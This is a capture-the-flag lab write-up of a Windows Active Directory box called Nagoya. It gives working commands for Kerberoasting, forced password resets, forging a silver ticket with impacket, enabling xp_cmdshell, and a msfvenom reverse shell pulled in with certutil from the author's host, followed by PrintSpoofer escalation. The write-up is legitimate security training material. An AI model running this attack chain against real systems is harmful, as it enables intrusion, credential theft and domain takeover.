---
layout: writeup
title: Nagoya - Proving Grounds
date: 2024-08-30 13:32:20 +0300
description: A Writeup of the Nagoya Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, Active Directory, silver ticket, port forwarding]
---
**Note: If you are attempting this box as part of OSCP prep, consider skipping it. I don't believe it's a good interpretation of what would go on the exam.**

Here's a writeup for Nagoya, a Hard Proving Grounds box from the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/), notably on the Active Directory section. I take note that the community has rated this Very Hard, so whatever. Let's see what we see. As usual we get started with an nmap scan: `sudo nmap -A -sC -p- -v -T4 192.168.171.21 --open`. 
```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Nagoya Industries - Nagoya
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-08-16 20:15:21Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2024-08-16T20:16:56+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2024-08-16T20:16:17+00:00
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Issuer: commonName=nagoya.nagoya-industries.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-02T06:35:35
| Not valid after:  2025-02-01T06:35:35
| MD5:   349a:26ef:6484:a7c8:2720:1475:da02:d139
|_SHA-1: 08a4:f060:d5e4:89e1:d3d9:05ff:2388:3393:ff8b:89b2
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc             Microsoft Windows RPC
49679/tcp open  msrpc             Microsoft Windows RPC
49691/tcp open  msrpc             Microsoft Windows RPC
49698/tcp open  msrpc             Microsoft Windows RPC
49717/tcp open  msrpc             Microsoft Windows RPC

...
```

There's a few different paths to take here. I actually tried to list smb shares and check rpcclient, but I found nothing, and it often makes sense to get started with the web port anyway, so I go to the browser to check that out. Maybe we can find some creds or usernames to get started in case we need to brute force anything. 

![Nagoya1.png](/assets/images/Nagoya/Nagoya1.png){: .responsive-image}

We see we have an email with a domain, so we add that to `/etc/hosts` and check around the site. 

![Nagoya2.png](/assets/images/Nagoya/Nagoya2.png){: .responsive-image}

And there's a page showing a long list of team members in the form of the first and last names. Maybe we need to transform this list into usernames and get started with brute forcing. So I took the list and changed it so that I had these combinations for `First Last`: 
- `firstlast`
- `flast`
- `first.last`

That gave me 84 username options, hopefully I can whittle that down quickly. 

*Womp Womp*

I did not whittle that down quickly. In fact I did not whittle it down at all. After trying a number of brute forcing options, I wound up checking a writeup to see if I was on the write path. And I was...I guess. Evidently the credentials we were supposed to get were: `fiona.clark:Summer2023`. Fiona was 10th on the /Team page, so even if you guessed the exact format, it still would have taken 10 iterations to get through whatever password list you were using. And while the web page does says 2023, the string "Summer" doesn't exist on it. **And** "Summer2023" isn't even on rockyou.txt. So what the hell. The official hint recommends you to guess easy combinations like seasons + years, but this just seems stupid to me, and you'd still need to guess the exact format of the username and not waste time with a bunch of other perfectly reasonable guesses. Moving on. 

We try a few different things here to get more information:
1. `impacket-psexec nagoya-industries.com/fiona.clark:Summer2023@192.168.171.21`
2. `impacket-smb nagoya-industries.com/fiona.clark:Summer2023@192.168.171.21`
3. `evil-winrm -i 192.168.171.21 -u fiona.clark -p Summer2023 -U nagoya-industries.com`
4. `rpcclient 192.168.171.21 -U 'fiona.clark' -P 'Summer2023'`

Until we eventually get to smb (`smbclient -L \\\\192.168.171.21\\ -U fiona.clark`), which probably would have come sooner, but it would be nice to get RCE faster with one of the others. We **are** able to list the smb shares and eventually check them out. 
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

The first 3 are defaults, and it actually seems as though NETLOGON contains the same files as SYSVOL/scripts, so either way it's a ResetPassword directory which we can download and analyze. 

![Nagoya3.png](/assets/images/Nagoya/Nagoya3.png){: .responsive-image}

I checked through each of these files but couldn't find anything either by reading them directly or runnings `strings` on them. *Apparently you can run a tool called dnSpy on them, but it appears this is not available for ARM machines.* 

Apparently I needed to try a few other options with impacket. 
- `impacket-secretsdump nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 192.168.171.21`
	- Nothing
- `impacket-GetNPUsers nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 192.168.171.21`
	- Nothing
- `impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 192.168.171.21`
	- Bingo

We then use `john --wordlist=/usr/share/wordlists/rockyou.txt userSPNs.txt` and we get the password of `Service1` for the password of `svc_mssql`. 

Time to run it back and check all the same commands again. After a few of those we come back to rpcclient, and we actually can use it. That gives us the option to run `enumdomusers`, and we get this: 
```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[svc_helpdesk] rid:[0x450]
user:[Matthew.Harrison] rid:[0x452]
user:[Emma.Miah] rid:[0x453]
user:[Rebecca.Bell] rid:[0x454]
user:[Scott.Gardner] rid:[0x455]
user:[Terry.Edwards] rid:[0x456]
user:[Holly.Matthews] rid:[0x457]
user:[Anne.Jenkins] rid:[0x458]
user:[Brett.Naylor] rid:[0x459]
user:[Melissa.Mitchell] rid:[0x45a]
user:[Craig.Carr] rid:[0x45b]
user:[Fiona.Clark] rid:[0x45c]
user:[Patrick.Martin] rid:[0x45d]
user:[Kate.Watson] rid:[0x45e]
user:[Kirsty.Norris] rid:[0x45f]
user:[Andrea.Hayes] rid:[0x460]
user:[Abigail.Hughes] rid:[0x461]
user:[Melanie.Watson] rid:[0x462]
user:[Frances.Ward] rid:[0x463]
user:[Sylvia.King] rid:[0x464]
user:[Wayne.Hartley] rid:[0x465]
user:[Iain.White] rid:[0x467]
user:[Joanna.Wood] rid:[0x468]
user:[Bethan.Webster] rid:[0x469]
user:[Elaine.Brady] rid:[0x46b]
user:[Christopher.Lewis] rid:[0x46c]
user:[Megan.Johnson] rid:[0x46d]
user:[Damien.Chapman] rid:[0x46e]
user:[Joanne.Lewis] rid:[0x46f]
user:[svc_mssql] rid:[0x470]
user:[svc_tpl] rid:[0x471]
user:[svc_web] rid:[0x472]
```

So that's good. I actually don't know what else to do with `rpcclient`. We can check the groups with `enumdomgroups`. And we can learn more information about the users we have access to and what groups they are in, but there's nothing particularly interesting for either `fiona.clark` or `svc_mssql`. 

Apparently the key is to check every single user and realize that `christopher.lewis` is a part of the developer group and further suspect we can change his password. I was not familiar with this possibility with `rpcclient`, so I guess this is just a situation where we could have needed to look that up. **But crucially** we can't do this with the  `fiona.clark` or `svc_mssql`users. We actually need to get the `svc_helpdesk` user to do it, and the hash of that user can only be found using dnSpy on the `ResetPassword.exe` binary which I can not do from my machine. **So this box may not be possible from an ARM device alone.** I mean technically it probably is, but not by the intended path and not without reverse engineering skills which are well outside the scope of these labs. I really need to get another machine, but I can't right now. 

The hash discovered for the `svc_helpdesk` user is `U299iYRmikYTHDbPbxPoYYfa2j4x4cdg`. We'll need to use that to log back into `rpcclient`. Then we'll need to use this command:
`setuserinfo christopher.lewis 23 'thisb0xsucks!'`. That changes the password, and that allows us to run evil-winrm for code execution. 

![Nagoya4.png](/assets/images/Nagoya/Nagoya4.png){: .responsive-image}

And that gets us in. Great. I download and run winpeas, and we'll see what else I can find after that. Unfortunately nothing really sticks out from that. I run adPEAS as well, but mostly just to have an easy way to get the Bloodhound zip to my machine. 

Unfortunately that didn't work. I was able to get a bloodhound zip file, but it seemed to hang in the bloodhound console, and I'm not sure exactly if it can be fixed. Apparently it was the wrong version. So I ran SharpHound (`./SharpHound.exe --CollectionMethods All`), and then transferred the resulting zip. I started by marking our owned users as owned and then looked around. 

To be honest I found really nothing here. I suppose that this is a Local Privesc situation, and we need to focus on getting Local Admin. Apparently we already have two of the three kerberoastable users. 

![Nagoya5.png](/assets/images/Nagoya/Nagoya5.png){: .responsive-image}

After a while of looking around, I looked up a writeup again to see the next step, just in case I was blocked by machine for another time with this lab. [I found a writeup](https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f) which introduced two new vectors: Accessin the mssql db from mmy own machine using port forwarding and  impersonating the Administrator account with a silver ticket using the svc_mssql account. 

For port forwarding, I'm going to use [ligolo-ing](https://github.com/nicocha30/ligolo-ng)as I prefer it to alternatives. The commands here are pretty much the same every time, so there's less need to worry about syntax (once you transfer the ligolo agent to the Windows machine): 

From Kali:
1. `sudo ip tuntap add user pop mode tun ligolo`
2. `sudo ip link set ligolo up`
3. `sudo ip route add $targetIP.0/24 dev ligolo`
4. `sudo ./proxy -selfcert`

From Windows Target (agent file):
1. `.\ligolo.exe -connect $kaliIP:11601 -ignore-cert`

Then from Kali:
1. `session`
2. `1`
3. `Start`
	1. - `ip route add 240.0.0.1/32 dev ligolo`
	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on. So we can access mssql over 240.0.0.1:1433

We can then access the mssql instance using this command: `impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth`. 

![Nagoya6.png](/assets/images/Nagoya/Nagoya6.png){: .responsive-image}

Unfortunately the mssql instance does not seem to have any non-default databases in it, as all four of these are. We can try to use `xp_cmdshell`, but unfortunately our user does not have permission to perform this action. That's where the silver ticket comes in. 

The silver ticket requires the following three pieces of information:
1. SPN password hash
	1. In this case we already have the password (`Service1`), but we can use online tools to create the NTLM hash. [CodeBeautify.org](https://codebeautify.org/ntlm-hash-generator) has an NTLM generator which gives the output: `E3A0168BC21CFB88B95C954A5B18F57C`.
2. Domain SID
	1. We can get this with powershell:
		1. `Get-ADdomain`: `S-1-5-21-1969309164-1513403977-1686805993`
3. Target SPN
	1. We can get this with powershell:
		1. `Get-ADUser -Filter {SamAccountName -eq "$user"} -Properties ServicePrincipalNames`: `MSSQL/nagoya.nagoya-industries.com`
4. Target User
	1. Usually `-user-id 500 Administrator`

In total the command is: `impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`

Quite the mouthful. Or fingerful... Anyways - we run the command, and we see this: 

![Nagoya7.png](/assets/images/Nagoya/Nagoya7.png){: .responsive-image}

Success. Now I'm used to doing this from the target machine, but because we're using impacket, we need to make sure that we load the ticket (`Administrator.ccache`) into memory: `export KRB5CCNAME=$PWD/Administrator.ccache`. 

Then we need to create this file in `/etc/krb5user.conf`:
```
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]        
        NAGOYA-INDUSTRIES.COM = {
                kdc = nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```


After that, we can use impacket again to access the mssql instance, but this time we need to use the ticket rather than the username:password combination. Here's the command: `impacket-mssqlclient -k nagoya.nagoya-industries.com`. 

And I can't get it working. Initally I got this error: 
```
Traceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/mssqlclient.py", line 94, in <module>
    ms_sql.connect()
  File "/usr/lib/python3/dist-packages/impacket/tds.py", line 534, in connect
    af, socktype, proto, canonname, sa = socket.getaddrinfo(self.server, self.port, 0, socket.SOCK_STREAM)[0]
                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/socket.py", line 962, in getaddrinfo
    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
socket.gaierror: [Errno -2] Name or service not known
```

But I tried changing a few things, including crucially installing `krb5-user` which **does not come with kali by default**. I just want to point that out because this isn't made clear by the error. You can install with `sudo apt install krb5-user`. But after I do that, I actually get a new error: `TimeoutError: [Errno 110] Connection timed out`. 

After looking around for a while, this is happening because of the port forward. Basically our impacket is looking for the server on 240.0.0.1 rather than the target IP. We can fix this by adding `240.0.0.1      nagoya-industries.com nagoya.nagoya-industries.com` to our `/etc/hosts` file. Or to clarify - change the target IP to say `240.0.0.1` - it understandably won't work if there are two IPs both listing the same information. 

Then we can go back to running `impacket-mssqlclient -k nagoya.nagoya-industries.com`, and we go back into MSSQL. The point here is to execute xp_cmdshell so we can perform code execution from the db. We need to run these commands in order, running  `whoami` at the end to test:
1. `EXECUTE sp_configure 'show advanced options', 1;`
2. `RECONFIGURE;`
3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
4. `RECONFIGURE;`
5. `EXECUTE xp_cmdshell 'whoami';`

![Nagoya8.png](/assets/images/Nagoya/Nagoya8.png){: .responsive-image}

And we have code execution. Now we can get another shell with the `svc_mssql` user. We generate a reverse shell with msfvenom, download it from with xp_cmdshell, and execute it with these commands: 
1. From kali: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.183 LPORT=139 -f exe -o reverse139.exe`
2. From MSSQL: `EXECUTE xp_cmdshell 'certutil.exe -urlcache -split -f http://192.168.45.183/reverse139.exe C:\Windows\temp\reverse139.exe'`
3. From MSSQL: `EXECUTE xp_cmdshell 'C:\Windows\temp\reverse139.exe'`

And we get a shell:

![Nagoya9.png](/assets/images/Nagoya/Nagoya9.png){: .responsive-image}

An awful lot of work to get another user on the same machine we already had access to, but it's about to pay off, because `svc_mssql` has `SeImpersonatePrivilege`, so we should be able to run a Potato attack gaining full access over the machine. We transfer PrintSpoofer.exe to the target machine and run: `.\PrintSpoofer.exe -i -c cmd`. 

![Nagoya10.png](/assets/images/Nagoya/Nagoya10.png){: .responsive-image}

And we're finally done with this infuriating box. Really frustrating, but at least I learned a lot. 

### Lessons learned: 
- You can change a user's password using rpcclient. I had no idea. 
- You can get a silver ticket using `impacket-ticketer`. I had only done this with mimikatz on the target machine. I actually tried using mimikatz, but it kept crashing. Then I tried with a one-liner, but I couldn't get that working either. 
- When you generate a silver ticket remotely, you need to export the ticket using: `export KRB5CCNAME=$PWD/$ticket.ccache`. 
- And you need to add the `/etc/krb5user.conf` file. 
- Also you need to `apt install krb5-user` on kali. I've added it to my startup script. 
- When you are port forwarding, your commands may time out if you don't change the `/etc/hosts` file to reflect the new IP. 

### Key Takeaways:
- The first step is bs. All of those lessons learned would have stopped my progress, and even though they were frustrating, I'm glad to have learned them for the next time. But the step that could have potentially taken the longest in the whole process is the very first step of finding `fiona.clark`'s credentials. If you don't guess the username structure correctly and guess the password, you will never complete this box. And you basically have to *guess* it! `Summer2023` is only in one wordlist in kali - `/usr/share/seclists/Passwords/common_corporate_passwords.lst`, and even that list is mostly useless if you don't find and replace tags in it. For example, a bunch of lines say `<COMPANY>` or `<DEPARTMENT>` or `<SPORTS TEAM/HOBBY>` which is nice if you replace them all for a specific user who's information we have. It's functionally useless without that information which we don't have. **Furthermore** we don't even have one usernames, we have 28 people's names, and there's not even a hint on the username because the only email with have is `info@nagoya-industries.com` This part is just really annoying in a lab environment. 
  
- So the box sucks right? Not exactly! It's probably the most realistic box I've ever done! Real life passwords aren't limited to rockyou.txt, and this box had a ton of other twists and turns. You need four different users to fully exploit the machine. You have to brute force, reverse engineer a binary, crack a hash, change a user's password, gain RCE, forward a port, generate a silver ticket, get a reverse shell, and use the SeImpersonatePrivilege for a Potato attack. So many techniques; it's really cool. 
  
- But it does kind suck for a box. It's not like there's a ton of payoff, and to be honest there definitely isn't enough to justify the first step, at least not in the context of these proving grounds writeups. There's a reason a ton of them keep a default password or use `admin:admin` for the web app first step - because if we spend all our time trying to brute force (or even guess!) a password, we don't get tested on anything else. For that reason, even though it's realistic, I do think they should get do something about the brute force first step. 
  
- And it definitely shouldn't belong on an OSCP Prep List. This kind of time consuming first step is not realistic for the exam, at least as far as I can tell. You're supposed to enumerate, not guess or spend a ton of time brute forcing. For that reason (along with a few other boxes), I really don't recommend the LainKusunagi list for OSCP prep. At the time of writing this, I only have one left, and I'm seriously considering skipping it despite my completionist nature. 